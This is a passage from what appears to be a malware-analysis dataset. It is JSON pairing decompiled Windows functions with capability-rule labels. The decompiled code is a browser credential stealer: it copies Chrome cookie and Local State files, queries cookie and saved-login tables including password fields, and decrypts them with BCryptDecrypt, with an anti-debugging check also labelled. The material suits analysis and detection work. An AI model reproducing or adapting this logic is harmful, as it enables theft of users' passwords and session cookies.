uVar3 = fcn.004040d5(&var_38h);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.004043c7(uVar3);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.00406f1d();\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                var_38h = 0;\n                            }\n                        }\n                        if (puVar8 != NULL) {\n                            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar8);\n                            var_50h = uVar9 >> 0x20;\n                            var_4ch = uVar9;\n                            if (0 < iVar7) {\n                                uVar3 = fcn.004040d5(&var_20h);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.004043c7(uVar3);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.00406f1d();\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                var_20h = NULL;\n                            }\n                        }\n                        if (iVar2 != 0) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar2);\n                            var_50h = uVar9 >> 0x20;\n                            var_4ch = uVar9;\n                            if (iVar2 != 0) {\n                                uVar3 = fcn.004040d5(&var_10h);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.004043c7(uVar3);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.00406f1d();\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                var_10h = 0;\n                            }\n                        }\n                        var_68h = var_54h;\n                        var_60h = var_58h;\n                        _var_70h = uVar9;\n                        if (*0x41e6ac != 0x270f) {\n                            fcn.004027c6(&var_80h);\n                            var_50h = uVar9 >> 0x20;\n                            var_4ch = uVar9;\n                            *0x41e6ac = *0x41e6ac + 1;\n                        }\n                        fcn.004015a1();\n                        var_50h = uVar9 >> 0x20;\n                        var_4ch = uVar9;\n                    }\n                    fcn.00406f1d();\n                    var_50h = uVar9 >> 0x20;\n                    var_4ch = uVar9;\n                    fcn.00406f1d();\n                    var_50h = uVar9 >> 0x20;\n                    var_4ch = uVar9;\n                    fcn.00406f1d();\n                    var_50h = uVar9 >> 0x20;\n                    var_4ch = uVar9;\n                    fcn.00406f1d();\n                    var_50h = uVar9 >> 0x20;\n                    var_4ch = uVar9;\n                    iVar2 = (**(param_1 + 0x60))(var_4h);\n                    var_50h = uVar9 >> 0x20;\n                    var_4ch = uVar9;\n                    puVar8 = NULL;\n                    uVar10 = uVar9;\n                }\n                puVar5 = puVar8;\n                if (iVar2 != 0) {\n                    (**(param_1 + 0x7c))(var_4h);\n                    var_50h = uVar10 >> 0x20;\n                    var_4ch = uVar10;\n                    (**0x41e8bc)(var_28h);\n                    var_50h = uVar10 >> 0x20;\n                    var_4ch = uVar10;\n                    goto code_r0x0040f456;\n                }\n            }\n            puVar8 = 0x1;\n            (**(param_1 + 0x7c))(var_4h);\n            var_50h = uVar10 >> 0x20;\n            var_4ch = uVar10;\n            (**0x41e8bc)(var_28h);\n            var_50h = uVar10 >> 0x20;\n            var_4ch = uVar10;\n        }\n        else {\n            puVar8 = NULL;\n            puVar5 = puVar8;\n        }\n    }\ncode_r0x0040f456:\n    fcn.00406f1d();\n    var_50h = uVar10 >> 0x20;\n    var_4ch = uVar10;\n    lpWideCharStr = puVar5;\n    fcn.00406f1d();\n    var_50h = uVar10 >> 0x20;\n    var_4ch = uVar10;\n    fcn.00406f1d();\n    var_50h = uVar10 >> 0x20;\n    var_4ch = uVar10;\n    fcn.00406f1d();\n    var_50h = uVar10 >> 0x20;\n    var_4ch = uVar10;\n    return puVar8;\n}\n",
        "token_count": 3827
    },
    "0040f480": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f480(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint noname_0;\n    int32_t iVar11;\n    ulong uVar12;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    code *var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint *var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint lpExistingFileName;\n    int32_t var_1ch;\n    int32_t lpWideCharStr;\n    int32_t var_14h;\n    int32_t pszPath;\n    uint var_ch;\n    uint var_8h;\n    \n    pszPath = 0;\n    lpExistingFileName = 0;\n    var_34h = param_1;\n    fcn.00413915();\n    fcn.004043fa(0x4194e4);\n    uVar3 = fcn.004044c4();\n    fcn.004042c5(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(L\".tmp\");\n    fcn.00413915();\n    fcn.004043fa(0x4194e4);\n    uVar3 = fcn.004044c4();\n    fcn.004042c5(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(L\".tmp\");\n    uVar3 = fcn.00413915();\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(L\"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\");\n    uVar3 = fcn.00413915();\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(L\"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\");\n    lpWideCharStr = pszPath;\n    iVar4 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n    iVar11 = var_24h;\n    iVar10 = var_28h;\n    if ((((iVar4 != 0) && (iVar4 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(),  iVar4 != 0)) &&\n        (iVar4 = (*_sym.imp.KERNEL32.dll_CopyFileW)(pszPath, iVar11),  iVar4 != 0)) &&\n       (iVar4 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, iVar10),  iVar4 != 0)) {\n        lpWideCharStr = 0;\n        if (iVar11 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            lpWideCharStr = fcn.00406e8d();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpWideCharStr, iVar11);\n        }\n        var_38h = *(param_1 + 0x40);\n        var_14h = 0;\n        if (lpWideCharStr != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0x200, lpWideCharStr, uVar3, 0, 0, 0, 0);\n            var_8h = fcn.00406f2c();\n            uVar6 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpWideCharStr);\n            uVar3 = var_8h;\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpWideCharStr, uVar6, var_8h, uVar5, 0, 0);\n            uVar3 = fcn.0040434f(uVar3);\n            fcn.0040415d(uVar3);\n            fcn.00406f1d();\n            fcn.00406f1d();\n        }\n        iVar4 = (*var_38h)(var_14h);\n        fcn.00406f1d();\n        if (iVar4 == 0) {\n            var_4ch = 0;\n            var_48h = 0;\n            iVar7 = fcn.00410827(noname_0, noname_0, &var_4ch, &var_48h);\n            iVar4 = var_34h;\n            var_8h = 1;\n            if ((iVar7 != 0) &&\n               (iVar7 = (**(var_34h + 0x44))\n                                  (var_3ch, \n                                   \"select host_key, path, name, encrypted_value, expires_utc, is_httponly, samesite, is_secure from cookies\"\n                                   , 0xffffffff, &var_ch),  iVar7 == 0)) {\n                puVar8 = fcn.00406fa7();\n                iVar7 = 9999;\n                if (puVar8 == NULL) {\n                    *0x41e6a8 = NULL;\n                }\n                else {\n                    *0x41e6a8 = puVar8 + 1;\n                    *puVar8 = 9999;\n                    puVar8 = *0x41e6a8;\n                    do {\n                        *puVar8 = 0;\n                        puVar8[1] = 0;\n                        puVar8[2] = 0;\n                        puVar8[3] = 0;\n                        iVar7 = iVar7 + -1;\n                        puVar8 = puVar8 + 10;\n                    } while (iVar7 != 0);\n                }\n                *0x41e6ac = 0;\n                iVar7 = (**(iVar4 + 0x60))();\n                iVar1 = iVar4;\n                while (iVar7 == 100) {\n                    var_14h = 0;\n                    var_30h = 0;\n                    pszPath = 0;\n                    var_1ch = 0;\n                    pcVar9 = (**(iVar4 + 0x4c))(var_ch);\n                    if (*pcVar9 != '\\0') {\n                        uVar3 = fcn.0040434f(pcVar9);\n                        fcn.0040415d(uVar3);\n                        fcn.00406f1d();\n                    }\n                    pcVar9 = (**(iVar4 + 0x4c))(var_ch, 1);\n                    if (*pcVar9 != '\\0') {\n                        uVar3 = fcn.0040434f(pcVar9);\n                        fcn.0040415d(uVar3);\n                        fcn.00406f1d();\n                    }\n                    pcVar9 = (**(iVar4 + 0x4c))(var_ch, 2);\n                    if (*pcVar9 != '\\0') {\n                        uVar3 = fcn.0040434f(pcVar9);\n                        fcn.0040415d(uVar3);\n                        fcn.00406f1d();\n                    }\n                    var_40h = var_48h;\n                    var_44h = var_4ch;\n                    (**(iVar4 + 0x78))(var_ch, 3);\n                    (**(iVar4 + 0x70))(var_ch, 3);\n                    iVar10 = fcn.004108a6(var_44h, var_40h);\n                    if (iVar10 == 0) {\n                        fcn.00406f1d();\n                    }\n                    else {\n                        uVar3 = fcn.0040434f(iVar10);\n                        fcn.0040415d(uVar3);\n                    }\n                    fcn.00406f1d();\n                    uVar12 = (**(iVar4 + 0x54))(var_ch, 4);\n                    var_44h = uVar12 >> 0x20;\n                    var_40h = (**(iVar4 + 0x50))(var_ch, 5);\n                    var_6ch = (**(iVar4 + 0x50))(var_ch, 6);\n                    var_2ch = (**(iVar4 + 0x50))(var_ch, 7);\n                    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    if (((pszPath != 0) && (iVar10 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pszPath),  0 < iVar10)) ||\n                       ((var_1ch != 0 && (iVar10 = (*pcVar2)(var_1ch),  0 < iVar10)))) {\n                        _var_94h = ZEXT816(0);\n                        if ((var_14h != 0) && (iVar10 = (*pcVar2)(var_14h),  0 < iVar10)) {\n                            uVar3 = fcn.004040d5(&var_50h);\n                            fcn.004043c7(uVar3);\n                            fcn.00406f1d();\n                            var_50h = 0;\n                        }\n                        if ((var_30h != 0) && (iVar10 = (*pcVar2)(var_30h),  0 < iVar10)) {\n                            uVar3 = fcn.004040d5(&var_54h);\n                            fcn.004043c7(uVar3);\n                            fcn.00406f1d();\n                            var_54h = 0;\n                        }\n                        if ((pszPath != 0) && (iVar10 = (*pcVar2)(pszPath),  0 < iVar10)) {\n                            uVar3 = fcn.004040d5(&var_58h);\n                            fcn.004043c7(uVar3);\n                            fcn.00406f1d();\n                            var_58h = 0;\n                        }\n                        if ((var_1ch != 0) && (iVar10 = (*pcVar2)(var_1ch),  iVar10 != 0)) {\n                            uVar3 = fcn.004040d5(&var_38h);\n                            fcn.004043c7(uVar3);\n                            fcn.00406f1d();\n                            var_38h = NULL;\n                        }\n                        var_80h = var_44h;\n                        var_7ch = var_40h;\n                        var_78h = var_6ch;\n                        var_74h = var_2ch;\n                        var_84h = uVar12;\n                        if (*0x41e6ac != 9999) {\n                            fcn.004027c6(&var_94h);\n                            *0x41e6ac = *0x41e6ac + 1;\n                        }\n                        fcn.004015a1();\n                    }\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    iVar7 = (**(iVar4 + 0x60))(var_ch);\n                    iVar1 = var_34h;\n                    iVar10 = var_28h;\n                    iVar11 = var_24h;\n                }\n                if (iVar7 != 0) {\n                    var_2ch = &stack0xffffff28;\n                    uVar3 = 0;\n                    puVar8 = &stack0xffffff28;\n                    if (iVar11 != 0) {\n                        (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar11);\n                        uVar5 = fcn.00406f2c();\n                        *var_2ch = uVar5;\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar5, iVar11);\n                        puVar8 = var_2ch;\n                    }\n                    var_2ch = puVar8;\n                    fcn.00413c34(uVar3);\n                    uVar3 = 0;\n                    var_2ch = &stack0xffffff28;\n                    if (iVar10 != 0) {\n                        var_2ch = &stack0xffffff28;\n                        (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10);\n                        uVar5 = fcn.00406f2c();\n                        *var_2ch = uVar5;\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar5, iVar10);\n                    }\n                    fcn.00413c34(uVar3);\n                    (**(iVar1 + 0x7c))();\n                    (**0x41e8bc)();\n                    goto code_r0x0040f6d9;\n                }\n            }\n            (**(var_34h + 0x7c))();\n            (**0x41e8bc)();\n            uVar3 = 0;\n            if (iVar11 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar11);\n                uVar3 = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar11);\n            }\n            fcn.00413c34(uVar3);\n            uVar3 = 0;\n            if (iVar10 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10);\n                uVar3 = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar10);\n            }\n            fcn.00413c34(uVar3);\n            goto code_r0x0040f6dd;\n        }\n        uVar3 = 0;\n        if (iVar11 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar11);\n            uVar3 = fcn.00406f2c();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar11);\n        }\n        fcn.00413c34(uVar3);\n        uVar3 = 0;\n        if (iVar10 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10);\n            uVar3 = fcn.00406f2c();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar10);\n        }\n        fcn.00413c34(uVar3);\n    }\ncode_r0x0040f6d9:\n    var_8h = 0;\ncode_r0x0040f6dd:\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return var_8h;\n}\n",
        "token_count": 3378
    },
    "0040fb4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ff45)\n// WARNING: Removing unreachable block (ram,0x0040ff5b)\n// WARNING: Removing unreachable block (ram,0x0040ff6a)\n// WARNING: Removing unreachable block (ram,0x0040ff7c)\n// WARNING: Removing unreachable block (ram,0x0040ff87)\n// WARNING: Removing unreachable block (ram,0x0040ffa7)\n// WARNING: Removing unreachable block (ram,0x0040ffae)\n// WARNING: Removing unreachable block (ram,0x0040ffb9)\n// WARNING: Removing unreachable block (ram,0x0040ffd9)\n// WARNING: Removing unreachable block (ram,0x0040ffe0)\n// WARNING: Removing unreachable block (ram,0x0040ffeb)\n// WARNING: Removing unreachable block (ram,0x0041000b)\n\nuint __cdecl fcn.0040fb4b(uint arg_8h, uint arg_ch, int32_t lpWideCharStr, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t in_ECX;\n    uint noname_0;\n    int32_t iVar10;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint pszPath;\n    uint lpExistingFileName;\n    uint var_8h;\n    \n    pszPath = 0;\n    lpExistingFileName = 0;\n    var_1ch = in_ECX;\n    fcn.00413915();\n    fcn.004043fa(0x4194e4);\n    uVar3 = fcn.004044c4();\n    fcn.004042c5(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(L\".tmp\");\n    fcn.00413915();\n    fcn.004043fa(0x4194e4);\n    uVar3 = fcn.004044c4();\n    fcn.004042c5(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(L\".tmp\");\n    uVar3 = fcn.00413915();\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(arg_8h);\n    uVar3 = fcn.00413915();\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    fcn.004043fa(arg_ch);\n    iVar4 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath);\n    iVar10 = var_14h;\n    iVar9 = var_18h;\n    if ((((iVar4 != 0) && (iVar4 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(lpExistingFileName),  iVar4 != 0)) &&\n        (iVar4 = (*_sym.imp.KERNEL32.dll_CopyFileW)(pszPath, iVar10, 0),  iVar4 != 0)) &&\n       (iVar4 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, iVar9, 0),  iVar4 != 0)) {\n        lpWideCharStr = 0;\n        if (iVar10 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10);\n            lpWideCharStr = fcn.00406e8d();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpWideCharStr, iVar10);\n        }\n        pcVar1 = *(in_ECX + 0x40);\n        if (lpWideCharStr != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpWideCharStr);\n            uVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0x200, lpWideCharStr, uVar3, 0, 0, 0, 0);\n            uVar5 = fcn.00406f2c();\n            uVar6 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpWideCharStr);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpWideCharStr, uVar6, uVar5, uVar3, 0, 0);\n            uVar3 = fcn.0040434f(uVar5);\n            fcn.0040415d(uVar3);\n            fcn.00406f1d();\n            fcn.00406f1d();\n        }\n        iVar4 = (*pcVar1)(0, &var_30h);\n        fcn.00406f1d();\n        if (iVar4 == 0) {\n            var_20h = 0;\n            pszPath = 0;\n            iVar7 = fcn.00410827(noname_0, noname_0, &var_20h, &pszPath);\n            iVar2 = var_1ch;\n            var_34h = 1;\n            iVar4 = iVar2;\n            if (iVar7 != 0) {\n                pcVar8 = \"select signon_realm, origin_url, username_value, password_value from logins\";\n                if (arg_14h != '\\0') {\n                    pcVar8 = \"select signon_realm, origin_url, username_value, password_value from wow_logins\";\n                }\n                iVar7 = (**(var_1ch + 0x44))(var_30h, pcVar8, 0xffffffff, &var_8h, 0);\n                if (iVar7 == 0) {\n                    iVar7 = (**(iVar2 + 0x60))(var_8h);\n                    while (iVar7 == 100) {\n                        var_2ch = 0;\n                        pcVar8 = (**(iVar2 + 0x4c))(var_8h, 0);\n                        if (*pcVar8 != '\\0') {\n                            uVar3 = fcn.0040434f(pcVar8);\n                            fcn.0040415d(uVar3);\n                            fcn.00406f1d();\n                        }\n                        pcVar8 = (**(iVar2 + 0x4c))(var_8h, 1);\n                        if (*pcVar8 != '\\0') {\n                            uVar3 = fcn.0040434f(pcVar8);\n                            fcn.0040415d(uVar3);\n                            fcn.00406f1d();\n                        }\n                        pcVar8 = (**(iVar2 + 0x4c))(var_8h, 2);\n                        if (*pcVar8 != '\\0') {\n                            uVar3 = fcn.0040434f(pcVar8);\n                            fcn.0040415d(uVar3);\n                            fcn.00406f1d();\n                        }\n                        uVar5 = pszPath;\n                        uVar3 = var_20h;\n                        (**(iVar2 + 0x78))(var_8h, 3);\n                        (**(iVar2 + 0x70))(var_8h, 3);\n                        iVar9 = fcn.004108a6(uVar3, uVar5);\n                        if (iVar9 == 0) {\n                            fcn.00406f1d();\n                        }\n                        else {\n                            uVar3 = fcn.0040434f(iVar9);\n                            fcn.0040415d(uVar3);\n                        }\n                        fcn.00406f1d();\n                        fcn.00406f1d();\n                        fcn.00406f1d();\n                        fcn.00406f1d();\n                        fcn.00406f1d();\n                        iVar7 = (**(iVar2 + 0x60))(var_8h);\n                        iVar4 = var_1ch;\n                        iVar9 = var_18h;\n                        iVar10 = var_14h;\n                    }\n                    if (iVar7 != 0) goto code_r0x0040fd59;\n                }\n            }\n            (**(iVar4 + 0x7c))(var_8h);\n            (**0x41e8bc)(var_30h);\n            uVar3 = 0;\n            if (iVar10 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10);\n                uVar3 = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar10);\n            }\n            fcn.00413c34(uVar3);\n            uVar3 = 0;\n            if (iVar9 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar9);\n                uVar3 = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar9);\n            }\n            fcn.00413c34(uVar3);\n            goto code_r0x0040fdb5;\n        }\ncode_r0x0040fd59:\n        uVar3 = 0;\n        if (iVar10 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10);\n            uVar3 = fcn.00406f2c();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar10);\n        }\n        fcn.00413c34(uVar3);\n        uVar3 = 0;\n        if (iVar9 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar9);\n            uVar3 = fcn.00406f2c();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar9);\n        }\n        fcn.00413c34(uVar3);\n    }\n    var_34h = 0;\ncode_r0x0040fdb5:\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return var_34h;\n}\n",
        "token_count": 2374
    },
    "004107d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004107d1(int32_t param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (param_1 != 0) {\n        if (*(param_1 + 0x30) != 0) {\n            (*_sym.imp.KERNEL32.dll_LocalFree)(*(param_1 + 0x30));\n        }\n        if (*(param_1 + 0x40) != 0) {\n            (*pcVar1)(*(param_1 + 0x40));\n        }\n        if (*(param_1 + 0x48) != 0) {\n            (*pcVar1)(*(param_1 + 0x48));\n        }\n        if (*(param_1 + 0x58) != 0) {\n            (*pcVar1)(*(param_1 + 0x58));\n        }\n        if (*(param_1 + 0x60) != 0) {\n            (*pcVar1)(*(param_1 + 0x60));\n        }\n        if (*(param_1 + 0x68) != 0) {\n            (*pcVar1)(*(param_1 + 0x68));\n        }\n        (*pcVar1)(param_1);\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "004108a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004108a6(int32_t arg_8h, int32_t hKey)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int16_t *in_ECX;\n    uint32_t in_EDX;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t pbInput;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_ch;\n    uint32_t cbInput;\n    \n    cbInput = cbInput & 0xff000000 | 0x303176;\n    if (((in_EDX < 3) || (*in_ECX != 0x3176)) || (uVar1 = *(in_ECX + 1),  uVar1 != 0x30)) {\n        iVar3 = fcn.004103e4(in_stack_ffffff80, in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, \n                             in_stack_ffffff90, &var_ch, &cbInput);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        arg_8h_00 = fcn.00401000(cbInput + 1);\n        uVar2 = cbInput;\n        fcn.00401293(arg_8h_00, 0, cbInput + 1);\n        fcn.0040126d(arg_8h_00, var_ch, uVar2);\ncode_r0x004109ee:\n        (*_sym.imp.KERNEL32.dll_LocalFree)(var_ch);\n    }\n    else {\n        if (arg_8h == 0) {\n            return uVar1;\n        }\n        if (hKey == 0) {\n            return uVar1;\n        }\n        fcn.00401293(&var_4ch, 0, 0x40);\n        var_44h = in_ECX + 3;\n        var_4ch = 0x40;\n        var_48h = 1;\n        var_34h = (in_EDX - 0x10) + in_ECX;\n        pbInput = 0xc;\n        cbInput = in_EDX - 0x1f;\n        var_30h = 0x10;\n        if (cbInput != 0) {\n            var_ch = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, cbInput);\n            if (var_ch == 0) {\n                return 0;\n            }\n            iVar3 = (*_sym.imp.bcrypt.dll_BCryptDecrypt)\n                              (hKey, var_44h + pbInput, cbInput, &var_4ch, 0, 0, var_ch, cbInput, &cbInput, 0);\n            if ((iVar3 == 0) && (cbInput != 0)) {\n                arg_8h_00 = fcn.00401000(cbInput + 1);\n                uVar2 = cbInput;\n                fcn.00401293(arg_8h_00, 0, cbInput + 1);\n                fcn.0040126d(arg_8h_00, var_ch, uVar2);\n                goto code_r0x004109ee;\n            }\n        }\n        arg_8h_00 = 0;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 796
    },
    "00410ad5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410ad5(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint hostshort;\n    uint uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = in_ECX + 0xf6;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    uVar5 = extraout_ECX;\n    if (in_ECX[0x7b] == 0) {\n        uVar6 = *(arg_8h + 0xc);\n        iVar3 = arg_8h + 8;\n        hostshort = extraout_ECX;\n        fcn.00404385(iVar3);\n        iVar4 = fcn.00406871(iVar3, hostshort);\n        uVar5 = extraout_ECX_00;\n        if (iVar4 != 0) goto code_r0x00410b16;\ncode_r0x00410b37:\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1, iVar3, hostshort, uVar6);\n        uVar5 = 1;\n    }\n    else {\ncode_r0x00410b16:\n        if (in_ECX[3] == 0) {\n            uVar6 = *(arg_8h + 4);\n            fcn.00404385(arg_8h);\n            iVar4 = fcn.00406871(arg_8h, uVar5);\n            iVar3 = arg_8h;\n            hostshort = uVar5;\n            if (iVar4 == 0) goto code_r0x00410b37;\n        }\n        iVar3 = fcn.00402a2f(0);\n        if (iVar3 == 0) {\n            fcn.00402771();\n        }\n        iVar3 = fcn.00402a2f(0);\n        if (iVar3 == 0) {\n            fcn.00402771();\n        }\n        var_8h = in_ECX[4];\n        var_4h = in_ECX[0x7c];\n        fcn.00402746(fcn.004109fb, &var_8h);\n        fcn.00402746(fcn.00410a68, &var_8h);\n        pcVar2 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n        *in_ECX = 1;\n        (*pcVar2)(puVar1);\n        fcn.00402a2f(0xffffffff);\n        fcn.00402a2f(0xffffffff);\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n        *in_ECX = 0;\n        (*pcVar2)(puVar1);\n        fcn.00410c8a();\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 671
    },
    "00410c08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
